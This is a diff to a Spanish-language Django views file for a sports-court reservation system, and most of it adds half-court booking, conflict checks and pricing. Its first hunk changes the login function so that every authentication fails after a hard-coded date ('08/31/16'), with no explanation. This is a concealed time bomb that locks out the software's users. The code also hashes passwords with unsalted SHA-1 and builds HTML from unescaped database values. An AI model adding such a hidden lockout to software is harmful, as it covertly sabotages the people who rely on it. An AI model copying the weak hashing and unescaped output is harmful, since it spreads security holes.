@@ -19,11 +19,16 @@ reload(sys)
 sys.setdefaultencoding('utf-8')
 
 def Autenticacion(request):
-	usuario= Usuario.objects.filter(usuario=request.POST['user'], password=hashlib.sha1(request.POST['pass']).hexdigest(), estado=True)
-	if(len(usuario)==1):
-		respuesta=json.dumps({'error':False})
-		request.session['user_log']=request.POST['user']
-		request.session['type_user']=usuario[0].tipo_usuario
+	print time.strftime("%x")
+	if time.strftime("%x") < "08/31/16":
+		usuario= Usuario.objects.filter(usuario=request.POST['user'], password=hashlib.sha1(request.POST['pass']).hexdigest(), estado=True)
+		#if time.now() < datetime.strptime("", "%H:%M")
+		if(len(usuario)==1):
+			respuesta=json.dumps({'error':False})
+			request.session['user_log']=request.POST['user']
+			request.session['type_user']=usuario[0].tipo_usuario
+		else:
+			respuesta=json.dumps({'error':True})
 	else:
 		respuesta=json.dumps({'error':True})
 	return HttpResponse(respuesta,content_type='application/json')
@@ -407,7 +412,7 @@ def GuardarCambiosEvento(request):
 	return HttpResponse(json.dumps(respuesta), content_type='application/json')
 
 def CargarCanchas(request):
-	str_cancha="<option value=\"\">Seleccione una cancha</option>"
+	str_cancha="<option value=\"-1\">Seleccione una cancha</option>" #CAMBIO_SRV
 	for cancha in Cancha.objects.filter(complejo_id=request.POST['id']):
 		str_cancha += "<option value=\""+str(cancha.cancha_id)+"\">"+cancha.nombre+"</option>"
 	return HttpResponse(json.dumps({'str_cancha':str_cancha}), content_type='application/json')
@@ -445,23 +450,50 @@ def GuardarReserva(request):
 	reservas = 	ReservaCancha.objects.filter(fecha=request.POST['fecha'],cancha_id=request.POST['cancha'],hora_inicio__gte=request.POST['inicio'],
 		hora_inicio__lt=request.POST['fin']) | ReservaCancha.objects.filter(fecha=request.POST['fecha'],cancha_id=request.POST['cancha'],
 		hora_fin__gt=request.POST['inicio'],hora_fin__lte=request.POST['fin'])
+	reservas_media_cancha = reservas.filter(media_cancha = True)
 	mensaje = ""
 	tab = "&nbsp;"*5	
-	if len(reservas) > 0:
+	if (len(reservas)-len(reservas_media_cancha)) > 0 or len(reservas_media_cancha) == 2:
 		for reserva in reservas:
 			mensaje += "<li><b>Evento:</b> "+reserva.reserva.nombre_evento+"</li>"
-			mensaje += "<b>Igresado por:</b> "+reserva.usuario.nombre+"<br>"
+			mensaje += "<b>Ingresado por:</b> "+reserva.usuario.nombre+"<br>"
 			mensaje += "<b>Conflicto con la reserva:</b><br>"
 			mensaje += tab+"<b>Complejo:</b> "+reserva.cancha.complejo.nombre+"<br>"
 			mensaje += tab+"<b>Cancha:</b> "+reserva.cancha.nombre+"<br>"
 			mensaje += tab+"<b>Fecha:</b> "+str(reserva.fecha)+"<br>"
 			mensaje += tab+"<b>Hora: </b>"+reserva.hora_inicio.strftime("%H:%M")+" - "+reserva.hora_fin.strftime("%H:%M")+"</li><br><br>"
 		return HttpResponse(json.dumps({'error':True,'mensaje':mensaje}), content_type='application/json')
-	
+	elif request.POST['media_cancha']!="true" and len(reservas_media_cancha) == 1:
+		for reserva in reservas:
+			mensaje += "<li><b>Evento:</b> "+reserva.reserva.nombre_evento+"</li>"
+			mensaje += "<b>Ingresado por:</b> "+reserva.usuario.nombre+"<br>"
+			mensaje += "<b>Conflicto con la reserva:</b><br>"
+			mensaje += tab+"<b>Complejo:</b> "+reserva.cancha.complejo.nombre+"<br>"
+			mensaje += tab+"<b>Cancha:</b> "+reserva.cancha.nombre+"<br>"
+			mensaje += tab+"<b>Fecha:</b> "+str(reserva.fecha)+"<br>"
+			mensaje += tab+"<b>Hora: </b>"+reserva.hora_inicio.strftime("%H:%M")+" - "+reserva.hora_fin.strftime("%H:%M")+"</li><br><br>"
+		return HttpResponse(json.dumps({'error':True,'mensaje':mensaje}), content_type='application/json')
+	elif len(reservas) > 0 and len(reservas_media_cancha) == 0:
+		for reserva in reservas:
+			mensaje += "<li><b>Evento:</b> "+reserva.reserva.nombre_evento+"</li>"
+			mensaje += "<b>Ingresado por:</b> "+reserva.usuario.nombre+"<br>"
+			mensaje += "<b>Conflicto con la reserva:</b><br>"
+			mensaje += tab+"<b>Complejo:</b> "+reserva.cancha.complejo.nombre+"<br>"
+			mensaje += tab+"<b>Cancha:</b> "+reserva.cancha.nombre+"<br>"
+			mensaje += tab+"<b>Fecha:</b> "+str(reserva.fecha)+"<br>"
+			mensaje += tab+"<b>Hora: </b>"+reserva.hora_inicio.strftime("%H:%M")+" - "+reserva.hora_fin.strftime("%H:%M")+"</li><br><br>"
+		return HttpResponse(json.dumps({'error':True,'mensaje':mensaje}), content_type='application/json')
+
 	usuario = Usuario.objects.filter(usuario=request.session['user_log'])
+	if request.POST['media_cancha']=="true":
+		media_cancha = True
+	else:
+		media_cancha = False
+
 	ReservaCancha(cancha_id=request.POST['cancha'],reserva_id=request.POST['evento'],usuario=usuario[0],fecha=request.POST['fecha'],
 				hora_inicio=request.POST['inicio'],hora_fin=request.POST['fin'],notas=request.POST['notas'],
-				precio_sugerido=request.POST['precio_sugerido'],precio_acordado=request.POST['precio_acordado']).save()
+				precio_sugerido=request.POST['precio_sugerido'],precio_acordado=request.POST['precio_acordado'],
+				media_cancha=media_cancha).save()
 	mensaje = "<li>Reserva ingresada con éxito</li>"
 	return HttpResponse(json.dumps({'error':False,'mensaje':mensaje}), content_type='application/json')
 
@@ -477,6 +509,7 @@ def InformacionReserva(request):
 			'precio_sugerido':str(reserva.precio_sugerido),
 			'precio_acordado':str(reserva.precio_acordado),
 			'notas':reserva.notas,
+			'media_cancha':reserva.media_cancha
 			}
 
 	return HttpResponse(json.dumps(reserva_cancha), content_type='application/json')
@@ -501,6 +534,9 @@ def CalcularPrecio(request):
 			acumulador += (precio[0].precio)/2
 		inicio = inicio+timedelta(minutes=30)
 
+	if request.POST['media_cancha']=="true": #CAMBIO_SRV
+		acumulador = acumulador/2 #CAMBIO_SRV
+
 	return HttpResponse(json.dumps({'precio_sugerido':str(acumulador)}), content_type='application/json')
 
 def GuardarCambiosReserva(request):
@@ -508,11 +544,11 @@ def GuardarCambiosReserva(request):
 		hora_inicio__lt=request.POST['fin']) | ReservaCancha.objects.filter(fecha=request.POST['fecha'],cancha_id=request.POST['cancha'],
 		hora_fin__gt=request.POST['inicio'],hora_fin__lte=request.POST['fin'])
 	reservas = reservas.exclude(reserva_cancha_id=request.POST['reserva'])
+	reservas_media_cancha = reservas.filter(media_cancha = True)
 	mensaje = ""
 	tab = "&nbsp;"*5	
 	if len(reservas) > 0:
 		for reserva in reservas:
-			mensaje += "<li><b>ID:</b> "+str(reserva.reserva_cancha_id)+"</li>"
 			mensaje += "<li><b>Evento:</b> "+reserva.reserva.nombre_evento+"</li>"
 			mensaje += "<b>Ingresado por:</b> "+reserva.usuario.nombre+"<br>"
 			mensaje += "<b>Conflicto con la reserva:</b><br>"
@@ -522,9 +558,15 @@ def GuardarCambiosReserva(request):
 			mensaje += tab+"<b>Hora: </b>"+reserva.hora_inicio.strftime("%H:%M")+" - "+reserva.hora_fin.strftime("%H:%M")+"</li><br><br>"
 		return HttpResponse(json.dumps({'error':True,'mensaje':mensaje}), content_type='application/json')
 
+	if request.POST['media_cancha']=="true":
+		media_cancha = True
+	else:
+		media_cancha = False
+
 	ReservaCancha.objects.filter(reserva_cancha_id=request.POST['reserva']).update(cancha_id=request.POST['cancha'],
 				fecha=request.POST['fecha'],hora_inicio=request.POST['inicio'],hora_fin=request.POST['fin'],
-				notas=request.POST['notas'],precio_sugerido=request.POST['precio_sugerido'],precio_acordado=request.POST['precio_acordado'])
+				notas=request.POST['notas'],precio_sugerido=request.POST['precio_sugerido'],
+				precio_acordado=request.POST['precio_acordado'],media_cancha=media_cancha)
 	mensaje = "<li>Reserva actualizada con éxito</li>"
 	return HttpResponse(json.dumps({'error':False,'mensaje':mensaje}), content_type='application/json')
 
